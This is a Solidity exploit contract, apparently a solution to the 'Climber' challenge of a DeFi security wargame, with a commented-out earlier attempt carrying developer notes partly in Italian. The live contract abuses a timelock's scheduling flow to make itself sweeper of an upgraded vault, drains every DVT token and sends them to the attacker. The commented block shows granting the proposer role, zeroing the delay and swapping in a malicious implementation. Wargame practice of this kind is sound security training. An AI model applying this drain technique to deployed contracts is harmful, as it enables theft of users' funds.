// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";


contract ClimberExploiter {

    IERC20 immutable dvt;
    address immutable vault;
    address immutable timelock;
    address immutable player;

    address[] targets;
    uint256[] values;
    bytes[] operations;

    constructor(address _dvt, address _timelock, address _vault) {
        dvt = IERC20(_dvt);
        vault = _vault;
        timelock = _timelock;
        player = msg.sender;
    }

    // will be called by the player after having pre-computed the calldatas
    function setABI(address[] memory _targets, bytes[] memory _operations) external {
        targets = _targets;
        values = new uint256[](_targets.length);
        operations = _operations;
    }

    function exploit() external {
        require(targets.length > 0, "NS"); // not setup
        
        bool ok;
        // execute schedule when called
        (ok, ) = timelock.call(
            abi.encodeWithSignature("schedule(address[],uint256[],bytes[],bytes32)",
                targets,
                values,
                operations,
                bytes32(0)
            )
        );
        require(ok, "schedule");

        // call setSweeper on the new vault implementation
        (ok, ) = vault.call(
            abi.encodeWithSignature("_setSweeper(address)", address(this))
        );
        require(ok, "setSweeper");

        // sweepFunds
        (ok, ) = vault.call(
            abi.encodeWithSignature("sweepFunds(address)", address(dvt))
        );
        require(ok, "sweepFunds");

        dvt.transfer(player, dvt.balanceOf(address(this)));

    }

}

// @note before this solution (which a YT video helped me develop) i tried to to all in one
// transaction but I discovered that i cannot correctly assing the dataElements ABI
// that's why we need this contract to call schedule() with a pre-calculated ABI
/*
interface IClimberTimelock {

    function hasRole(bytes32 role, address account) external view returns (bool);

    function schedule(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt) external;

    // allows anyone to execute a ReadyToExecute proposal
    function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt) external payable;
}

contract ClimberExploiter {

    bytes32 constant PROPOSER_ROLE = 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1;

    address immutable vault;
    IClimberTimelock immutable timelock;
    ClimberVaultMaliciousImplementation immutable implementation;
    IERC20 immutable dvt;
    address immutable player;

    constructor(address _vault, address _timelock, address _dvt) {
        vault = _vault;
        timelock = IClimberTimelock(_timelock);
        implementation = new ClimberVaultMaliciousImplementation();
        console.log("implementation: ", address(implementation));
        dvt = IERC20(_dvt);
        player = msg.sender;
    }

    function attack() external {
        require(msg.sender == player, "NP");

        // 1. execute an operation on the timelock
        address[] memory _targets = new address[](3);
        uint256[] memory _values = new uint256[](3);
        bytes[] memory _dataElements = new bytes[](3);
        bytes32 salt = keccak256(abi.encode("helloworld"));

        // 1.1 let this contract become the proposer since ClimberTimelock have ADMIN_ROLE he can call setupRole()
        _targets[0] = address(timelock);
        _values[0] = 0;
        // @question per qualche motivo address(this) ritorna una cosa diversa dal vero valore
        _dataElements[0] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, 0xCafac3dD18aC6c6e92c921884f9E4176737C052c);

        /*
        // 1.2 updgrate the Vault to a new version where this contract is the sweeper
        _targets[1] = address(vault);
        _values[1] = 0;
        _dataElements[1] = abi.encodeWithSignature("upgradeToAndCall(address,bytes)",
            address(vault),
            abi.encodeWithSignature("setSweeper(address)", player)
        );

        // 1.4 set delay to 0
        _targets[1] = address(timelock);
        _values[1] = 0;
        _dataElements[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        // 1.5 pass a proposal with the parameters used in execution to avoid revert after
        _targets[2] = address(timelock);
        _values[2] = 0;
        _dataElements[2] = abi.encodeWithSignature("schedule(address[],uint256[],bytes[],bytes32)", 
            _targets,
            _values,
            _dataElements, // @audit non ha il valore corretto, probabilmente perch√® l'assegnamento sopra non ha ancora fatto effetto qui
            salt
        );

        timelock.execute(_targets, _values, _dataElements, salt);

        //dvt.transfer(player, dvt.balanceOf(address(this)));

    }

}
*/